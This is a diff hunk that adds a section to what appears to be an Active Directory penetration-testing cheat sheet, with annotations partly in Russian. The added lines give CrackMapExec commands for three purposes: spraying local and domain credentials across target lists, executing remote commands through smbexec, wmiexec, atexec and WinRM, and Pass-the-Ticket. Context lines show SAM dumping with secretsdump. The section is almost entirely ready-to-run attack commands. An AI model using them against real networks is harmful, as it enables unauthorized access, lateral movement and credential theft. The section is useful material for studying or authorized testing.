@@ -156,6 +156,28 @@ For attack need to know username and flag 'do not require preauth'
                   psexec.py
                   evil-winrm
 3) DUMP LOCAL SAM: secretsdump.py [domain]/[username]:[password]@[TARGET IP]
+
+Credentials spraying:
+Синтаксис для использования локальных учетных записей выглядит следующим образом: cme smb -d . -u username -p password targets.txt
+Для доменных: cme smb -d domain -u username -p password targets.txt
+Для какой‐то конкретной учетки мы можем сделать проверку прав сразу на группе целей: cme smb -d . -u admin -p passwd --shares targets.txt 2>&1 | grep Pwn3d
+
+CRACKMAPEXEC - REMOTE CODE EXECUTION:
+cme smb -d . -u admin -p s3cr3t -x 'ipconfig' targets.txt
+cme smb -d . -u admin -p s3cr3t -X 'Get-Service' targets.txt
+cme smb --exec-method smbexec -d . -u admin -p s3cr3t -x ipconfig targets.txt
+cme smb --exec-method wmiexec -d . -u admin -p s3cr3t -x ipconfig targets.txt
+cme smb --exec-method atexec -d . -u admin -p s3cr3t -x ipconfig targets.txt
+cme winrm -d . -u admin -p s3cr3t -x ipconfig targets.txt
+Используем технику Pass-the-Ticket на группе целей: KRB5CCNAME=$(pwd)/tgt.ccache cme smb -k -u admin -x 'ipconfig' targets.txt
+
+CMEDB: 
+proto smb; //получения информации для SMB.
+creds; //Список сохраненных учетных записей.
+hosts; //Список хостов, на которые были попытки входа.
+Сохраненные таким образом учетные записи в дальнейшем можно использовать в cme по ID: cme smb -id 7 --shares targets.txt
+
+CME MIMIKATZ.
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## TOKEN IMPERSONATING WITH INCOGNITO
 Delegate token - login or RDP;
